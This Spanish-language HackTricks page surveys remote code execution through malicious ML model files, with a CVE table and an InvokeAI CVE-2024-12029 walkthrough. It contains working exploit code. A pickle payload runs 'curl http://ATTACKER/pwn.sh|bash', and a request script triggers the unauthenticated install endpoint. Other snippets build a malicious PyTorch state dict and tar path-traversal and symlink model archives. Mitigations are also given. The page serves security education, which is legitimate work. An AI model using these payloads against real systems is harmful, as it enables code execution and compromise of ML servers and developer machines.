# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Cargando modelos a RCE

Los modelos de Machine Learning generalmente se comparten en diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Estos modelos pueden ser cargados en las máquinas de los desarrolladores o en sistemas de producción para ser utilizados. Por lo general, los modelos no deberían contener código malicioso, pero hay algunos casos en los que el modelo puede ser utilizado para ejecutar código arbitrario en el sistema como una característica prevista o debido a una vulnerabilidad en la biblioteca de carga de modelos.

En el momento de la redacción, estos son algunos ejemplos de este tipo de vulnerabilidades:

| **Framework / Tool**        | **Vulnerabilidad (CVE si está disponible)**                                                    | **Vector RCE**                                                                                                                           | **Referencias**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserialización insegura en* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malicioso en el punto de control del modelo conduce a la ejecución de código (eludiendo la salvaguarda `weights_only`)          | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + descarga de modelo malicioso causa ejecución de código; RCE de deserialización de Java en la API de gestión                      | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Cargar modelo desde YAML utiliza `yaml.unsafe_load` (ejecución de código) <br> Cargar modelo con capa **Lambda** ejecuta código Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (análisis de TFLite)                                                                                          | Modelo `.tflite` manipulado provoca desbordamiento de enteros → corrupción de heap (potencial RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Cargar un modelo a través de `joblib.load` ejecuta pickle con la carga útil `__reduce__` del atacante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (inseguro `np.load`) *disputado*                                                                              | `numpy.load` por defecto permitía arreglos de objetos pickleados – `.npy/.npz` maliciosos provocan ejecución de código                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (traversal de directorios) <br> **CVE-2024-5187** (traversal de tar)                                                    | La ruta de pesos externos del modelo ONNX puede escapar del directorio (leer archivos arbitrarios) <br> Modelo ONNX malicioso tar puede sobrescribir archivos arbitrarios (conduciendo a RCE) | |
| ONNX Runtime (riesgo de diseño)  | *(Sin CVE)* operaciones personalizadas de ONNX / flujo de control                                                                                    | Modelo con operador personalizado requiere cargar el código nativo del atacante; gráficos de modelo complejos abusan de la lógica para ejecutar cálculos no intencionados   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (traversal de ruta)                                                                                          | Usar la API de carga de modelos con `--model-control` habilitado permite traversal de ruta relativa para escribir archivos (por ejemplo, sobrescribir `.bashrc` para RCE)    | |
| **GGML (formato GGUF)**      | **CVE-2024-25664 … 25668** (múltiples desbordamientos de heap)                                                                         | Archivo de modelo GGUF malformado causa desbordamientos de buffer en el parser, habilitando la ejecución de código arbitrario en el sistema víctima                     | |
| **Keras (formatos antiguos)**   | *(Sin nuevo CVE)* Modelo Keras H5 legado                                                                                         | Modelo HDF5 malicioso (`.h5`) con código de capa Lambda aún se ejecuta al cargar (el modo seguro de Keras no cubre el formato antiguo – “ataque de degradación”) | |
| **Otros** (general)        | *Falla de diseño* – serialización de Pickle                                                                                         | Muchas herramientas de ML (por ejemplo, formatos de modelo basados en pickle, `pickle.load` de Python) ejecutarán código arbitrario incrustado en archivos de modelo a menos que se mitigue | |

Además, hay algunos modelos basados en pickle de Python, como los utilizados por [PyTorch](https://github.com/pytorch/pytorch/security), que pueden ser utilizados para ejecutar código arbitrario en el sistema si no se cargan con `weights_only=True`. Por lo tanto, cualquier modelo basado en pickle podría ser especialmente susceptible a este tipo de ataques, incluso si no están listados en la tabla anterior.

### 🆕  InvokeAI RCE a través de `torch.load` (CVE-2024-12029)

`InvokeAI` es una popular interfaz web de código abierto para Stable-Diffusion. Las versiones **5.3.1 – 5.4.2** exponen el endpoint REST `/api/v2/models/install` que permite a los usuarios descargar y cargar modelos desde URLs arbitrarias.

Internamente, el endpoint eventualmente llama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Cuando el archivo suministrado es un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` realiza una **deserialización de pickle**. Debido a que el contenido proviene directamente de la URL controlada por el usuario, un atacante puede incrustar un objeto malicioso con un método `__reduce__` personalizado dentro del checkpoint; el método se ejecuta **durante la deserialización**, lo que lleva a **ejecución remota de código (RCE)** en el servidor de InvokeAI.

La vulnerabilidad fue asignada como **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Guía de explotación

1. Crear un checkpoint malicioso:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Aloja `payload.ckpt` en un servidor HTTP que controlas (por ejemplo, `http://ATTACKER/payload.ckpt`).
3. Activa el endpoint vulnerable (no se requiere autenticación):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Cuando InvokeAI descarga el archivo, llama a `torch.load()` → el gadget `os.system` se ejecuta y el atacante obtiene ejecución de código en el contexto del proceso InvokeAI.

Explotación lista para usar: **Módulo Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo el flujo.

#### Condiciones

•  InvokeAI 5.3.1-5.4.2 (bandera de escaneo por defecto **false**)
•  `/api/v2/models/install` accesible por el atacante
•  El proceso tiene permisos para ejecutar comandos de shell

#### Mitigaciones

* Actualizar a **InvokeAI ≥ 5.4.3** – el parche establece `scan=True` por defecto y realiza un escaneo de malware antes de la deserialización.
* Al cargar puntos de control programáticamente, usar `torch.load(file, weights_only=True)` o el nuevo [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Hacer cumplir listas de permitidos / firmas para fuentes de modelos y ejecutar el servicio con el menor privilegio.

> ⚠️ Recuerda que **cualquier** formato basado en pickle de Python (incluyendo muchos archivos `.pt`, `.pkl`, `.ckpt`, `.pth`) es inherentemente inseguro para deserializar desde fuentes no confiables.

---

Ejemplo de una mitigación ad-hoc si debes mantener versiones más antiguas de InvokeAI ejecutándose detrás de un proxy inverso:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Ejemplo – creando un modelo malicioso de PyTorch

- Crear el modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Cargar el modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelos para la Traversal de Rutas

Como se comentó en [**esta publicación del blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la mayoría de los formatos de modelos utilizados por diferentes marcos de IA se basan en archivos comprimidos, generalmente `.zip`. Por lo tanto, podría ser posible abusar de estos formatos para realizar ataques de traversal de rutas, permitiendo leer archivos arbitrarios del sistema donde se carga el modelo.

Por ejemplo, con el siguiente código puedes crear un modelo que creará un archivo en el directorio `/tmp` cuando se cargue:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
O, con el siguiente código puedes crear un modelo que creará un symlink al directorio `/tmp` cuando se cargue:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Referencias

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
